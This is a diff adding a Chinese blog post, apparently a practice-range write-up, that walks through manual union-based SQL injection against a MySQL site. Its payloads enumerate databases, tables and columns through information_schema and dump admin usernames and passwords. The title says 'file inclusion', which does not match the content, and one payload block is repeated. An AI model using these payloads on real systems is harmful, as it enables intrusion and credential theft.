@@ -432,6 +432,122 @@
       </tags>
   </entry>
   <entry>
+    <title>文件包含漏洞（一）</title>
+    <url>/blog/posts/10a6c5c8.html</url>
+    <content><![CDATA[<p>&emsp;以一个基础入门<a href="https://hack.zkaq.cn/battle/target?id=485e58d0afa7e4f7">靶场</a>为例，记录一下简单的一阶SQL手注操作以及针对MYSQL5以上版本的数据库信息语句构造。</p>
+<a id="more"></a>
+
+<h1 id="0x01-注入点"><a href="#0x01-注入点" class="headerlink" title="0x01 注入点"></a>0x01 注入点</h1><p>因为这是一个简单的入门手注靶场，就不做过多详述。</p>
+<p>一般的，先针对目标URL，观察下是数字型还是字符型注入。</p>
+<blockquote>
+<p><a href="http://59.63.200.79:8003/?id=1">http://59.63.200.79:8003/?id=1</a></p>
+</blockquote>
+<p>很容易发现，这应该是一个数字型注入点。</p>
+<p>构造payload，观察页面回显是否正常。</p>
+<p>?id=1 and 1=2</p>
+<p><img src="https://img-blog.csdnimg.cn/20210128220929969.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>发现的确符合预期的false逻辑执行，页面并没有能够正常回显。</p>
+<h1 id="0x02-判断字段数"><a href="#0x02-判断字段数" class="headerlink" title="0x02 判断字段数"></a>0x02 判断字段数</h1><p>构造payload</p>
+<p>?id=1 order by 1</p>
+<p>?id=1 order by 2</p>
+<p>?id=1 order by 3</p>
+<p><img src="https://img-blog.csdnimg.cn/2021012822095058.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>此时页面回显异常，说明当前表中有2个字段，即两列数据。进一步我们考虑利用union联合查询合并查询结果，替换成我们想要的信息，再次之前需要确认一下回显点。</p>
+<p>构造payload</p>
+<p>?id=1 and 1=2 union select 1,2#</p>
+<p>因为这里union联合查询会合并两句select语句结果，我们需要让第一句查询逻辑出错。</p>
+<p><img src="https://img-blog.csdnimg.cn/20210128220809101.png#pic_center" alt="在这里插入图片描述"></p>
+<p>通过图片可以确定回显点。</p>
+<h1 id="0x03-收集信息"><a href="#0x03-收集信息" class="headerlink" title="0x03 收集信息"></a>0x03 收集信息</h1><p>这边我们仅关注当前数据库信息。</p>
+<p>构造payload</p>
+<p>?id=1 and 1=2 union select 1,version()#</p>
+<p><img src="https://img-blog.csdnimg.cn/20210128220908485.png#pic_center" alt="在这里插入图片描述"></p>
+<p>可以看到是Mysql的5.5.53版本。</p>
+<h1 id="0X04-查询相关信息"><a href="#0X04-查询相关信息" class="headerlink" title="0X04 查询相关信息"></a>0X04 查询相关信息</h1><p>在5以上的MySQL有一个名为information_schema的内置库。 这是保存有关DB服务器中存在的表和列的信息。 也就是说，它包含站点的所有表和列的名称。</p>
+<p>因此我们可以分别构造payload如下来暴库、猜表、猜字段等</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 爆库</span><br><span class="line">select 1,2,3,...,SCHEMA_NAME from information_schema.SCHEMATA	</span><br><span class="line"># 猜表</span><br><span class="line">select 1,2,3,...,TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA&#x3D;&#39;目标库名&#39;</span><br><span class="line"># 猜字段	</span><br><span class="line">select 1,2,3,...,COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME&#x3D;&#39;目标表名&#39;</span><br></pre></td></tr></table></figure>
+<p>在此基础上，我们根据测试出的注入点、字段数、回显位置构造URL。</p>
+<p><strong>爆库</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1 and 1&#x3D;2 union select 1,SCHEMA_NAME from information_schema.SCHEMATA limit 0,1</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210128221011488.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>因为这里只能显示一处信息，逐次改变limit位置显然很麻烦。</p>
+<p>我们可以采用字符串拼接的方法，一次性爆出。</p>
+<p>构造payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1 and 1&#x3D;2 union select 1,group_concat(schema_name) from information_schema.SCHEMATA#</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://img-blog.csdnimg.cn/2021012822103940.png#pic_center" alt="在这里插入图片描述"></p>
+<p><strong>爆表</strong></p>
+<p>我们分别爆出maoshe、test两个库中的数据表。</p>
+<p>构造payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 1,group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA&#x3D;&#39;maoshe&#39;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210128221105970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>可以看见maoshe库中有admin、dirs、news和xss四张表。</p>
+<p>继续构造payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 1,group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA&#x3D;&#39;test&#39;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210128221126966.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>这是一个空库。</p>
+<p><strong>爆字段</strong></p>
+<ul>
+<li><p>admin表</p>
+<p>构造payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1 and 1&#x3D;2 union select 1,GROUP_CONCAT(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME&#x3D;&#39;admin&#39; limit 0,1#</span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/20210128221141140.png#pic_center" alt="在这里插入图片描述"></p>
+<ul>
+<li><p>dirs表</p>
+<p>构造payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1 and 1&#x3D;2 union select 1,GROUP_CONCAT(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME&#x3D;&#39;dirs&#39; limit 0,1#</span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/20210128221200950.png#pic_center" alt="在这里插入图片描述"></p>
+<ul>
+<li><p>news表</p>
+<p>构造payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1 and 1&#x3D;2 union select 1,GROUP_CONCAT(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME&#x3D;&#39;news&#39; limit 0,1#</span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/20210128221221239.png#pic_center" alt="在这里插入图片描述"></p>
+<ul>
+<li><p>xss表</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1 and 1&#x3D;2 union select 1,GROUP_CONCAT(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME&#x3D;&#39;xss&#39; limit 0,1#</span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/20210128221234908.png#pic_center" alt="在这里插入图片描述"></p>
+<p><strong>爆密码</strong></p>
+<p>比如针对admin表</p>
+<p>构造payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1 and 1&#x3D;2 union select 1,concat(username,&#39;|&#39;,password) from admin limit 0,1#</span><br></pre></td></tr></table></figure>
+
+
+
+<p>一次性爆出所有信息，可以这样构造</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1 and 1&#x3D;2 union select 1,group_concat(concat(username,&#39;|&#39;,password)) from admin #</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210128221306769.png#pic_center" alt="在这里插入图片描述"></p>
+<p>将username和password信息拼接在一起。</p>
+<p>一次性爆出所有信息，可以这样构造</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1 and 1&#x3D;2 union select 1,group_concat(concat(username,&#39;|&#39;,password)) from admin #</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210128221326429.png#pic_center" alt="在这里插入图片描述"></p>
+<p>当然这样还是有些麻烦，我们可以考虑编写一个自动化脚本来提交payload，爬取回显信息来完成自动化注入。</p>
+]]></content>
+      <categories>
+        <category>WEB安全</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>MySql</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>OOB之DNS隧道利用</title>
     <url>/blog/posts/b5fddb1e.html</url>
     <content><![CDATA[<p>&emsp;在对于注入中，存在无回显的情况，这时候通常使用Blind SQL进行猜解，利用这种方式获取信息，比较麻烦，并且容易因为频繁的数据请求导致ip被BAN。<br>&emsp;OOB通过另一种方式来确认和利用盲注漏洞带外通道技术通常需要脆弱的实体来生成带外的TCP/UDP/ICMP请求，然后，攻击者可以通过这个请求来提取数据。一次OOB攻击能够成功逃避监控，绕过防火墙且能更好的隐藏自己。</p>
